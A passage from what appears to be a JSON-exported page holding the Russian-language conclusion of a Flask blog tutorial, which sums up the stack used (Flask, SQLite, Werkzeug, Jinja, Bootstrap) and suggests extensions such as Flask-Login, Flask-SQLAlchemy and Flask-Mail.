style=\"font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">github.com/bodryakov-web/flask_blog</span></p><p>&nbsp;</p><p>&nbsp;</p><h4>Итог</h4><p>При создании данного небольшого приложения мы использовали фреймворк Flask, СУБД SQLite, набор инструментов Werkzeug, механизм шаблонов Jinja и css-фреймворк Bootstrap. В результате вы получили полностью функциональный блог, позволяющий создавать, читать, редактировать и удалять посты при помощи параметров URL и HTML-форм.</p><p>Вы можете самостоятельно продолжить разработку этого проекта с помощью большого количества расширений Flask, созданных сообществом, например:</p><p>Flask-Login — позволяет управлять сеансами пользователей: решает задачи входа в систему и выхода из системы.</p><p>Flask-SQLAlchemy — упрощает использование баз данных внутри Flask за счет поддержки ORM системы SQLAlchemy. ORM - Object Relational Mapper - это инструмент, разработанный для взаимодействия с сущностями базы данных, как классами и объектами в смысле объектно-ориентированного программирования Python.</p><p>Flask-Mail — помогает отправлять сообщения электронной почты из приложений Flask.</p><p>&nbsp;</p>"
            },
            "is_published": true
        }
    ]
}